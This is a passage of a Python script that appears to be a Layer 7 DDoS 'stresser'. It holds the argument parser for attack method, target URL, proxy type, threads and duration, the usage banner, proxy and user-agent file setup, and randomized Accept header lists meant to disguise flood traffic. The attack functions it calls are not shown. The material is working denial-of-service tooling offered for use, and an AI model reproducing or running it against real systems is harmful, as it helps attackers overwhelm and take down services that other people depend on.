        domain = str(siye).replace('http', '').replace('/', '').replace(':', '')
    else:
        domain = str(siye)
    print('please wait ...')
    r = pig(domain, count=5, interval=0.2)
    if r.is_alive:
        die = "ONLINE"
    else:
        die = "OFFLINE"
    print('\nAddress: '+r.address)
    print('Ping: '+r.avg_rtt)
    print('Aceepted Packets: '+r.packets_received+'/'+r.packets_sent)
    print('status: '+die+'\n')


def usgeaseets():
    global metho, url, SOCKST, thr, proxylist, muli, tim, l7s, tos, ots
    socks = ["1", "5"]
    sockst = ["socks5.txt", "http.txt"]
    try:
        if sys.argv[3] not in socks:
            SOCKST = Choice(socks)
        elif sys.argv[3]:
            SOCKST = sys.argv[3]

        else:
            SOCKST = Choice(socks)
    except:
        SOCKST = Choice(socks)

    if (str(SOCKST) == str('1')):
        proxylist = "http.txt"
    else:
        proxylist = "socks{0}.txt".format(SOCKST)

    try:
        met = str(sys.argv[1]).upper()
        if met not in list(methods):
            metho = Choice(methods).lower()
        elif sys.argv[1]:
            metho = sys.argv[1]
        else:
            metho = Choice(methods).lower()
    except:
        metho = Choice(methods).lower()
    try:
        if sys.argv[4]:
            thr = sys.argv[4]
        else:
            thr = Intn(100, 1000)
    except:
        thr = Intn(10, 1000)
    try:
        if (sys.argv[5] not in sockst):
            exit()
    except IndexError:
        pass
    except:
        print('Unknown Socks')
        exit()

    try:
        if sys.argv[6]:
            muli = sys.argv[6]
        else:
            muli = Intn(5, 100)
    except:
        muli = Intn(5, 100)
    try:
        if sys.argv[7]:
            tim = sys.argv[7]
        else:
            tim = Intn(10, 10000)
    except:
        tim = Intn(10, 10000)

    l7s = str(l7).replace("'", "").replace("[", "").replace("]", "")
    tos = str(to).replace("'", "").replace("[", "").replace("]", "")
    ots = str(ot).replace("'", "").replace("[", "").replace("]", "")


def usge():
    usgeaseets()
    print('* Coded For Better Stresser,Layer7 Only By Xiao Zhan（Fried prawns）&Wu Yiyan（Canada electric eel）')
    print('python3 {} <method> <url> <socks_type =5  or 1（1=HTTP）> <threads> <proxylist> <multiple> <timer>\n'.format(sys.argv[0]))
    print('Pls put proxies in files/proxys,named it as socks5.txt or http.txt and manual test it.')
    print(' > Methods:')
    print(' - L7')
    print(' | {} | {} Methods'.format(l7s, len(l7)))
    print(' - TOOLS')
    print(' | {} | {} Methods'.format(tos, len(to)))
    print(' - Other')
    print(' | {} | {} Methods'.format(ots, len(ot)))
    print(' - All {} Method \n'.format(len(methodsl)))

def makefile(text):
    if text == "files/":
        os.mkdir(text)
    elif text == "files/proxys/":
        os.mkdir(text)
    else:
        open(text, 'w').close()
    print('File: ', text)

if __name__ == '__main__':
    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re
    from time import sleep
    from icmplib import ping as pig
    from scapy.layers.inet import TCP
    from scapy.all import *
    from socket import gaierror
    
    acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
]

    data = ""
    strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890"
    Intn = random.randint
    Choice = random.choice
    if not os.path.exists('files/'):
        makefile('files/')
    if not os.path.exists('files/proxys/'):
        makefile('files/proxys/')
    if not os.path.exists('files/useragent.txt'):
        makefile('files/proxys/useragent.txt')
    if not os.path.exists('files/referers.txt'):
        makefile('files/referers.txt')
    try:
        with open("files/useragent.txt", "r") as f:
            readuser = f.read().splitlines()
        with open("files/referers.txt", "r") as f:
            readref = f.read().splitlines()
        UserAgent = Choice(readuser)
        referers = Choice(readref)
        try:
            bdr = str(sys.argv[1]).lower()
            if bdr == "tools":
                tools()
            elif bdr == "stop":
                stop()
            elif bdr == "help":
                usge()
            elif len(sys.argv) <= int(7):
                usge()
            else:
                main()
        except IndexError:
            usge()
    except KeyboardInterrupt:
        sys.exit()
    except IndexError:
        usge()

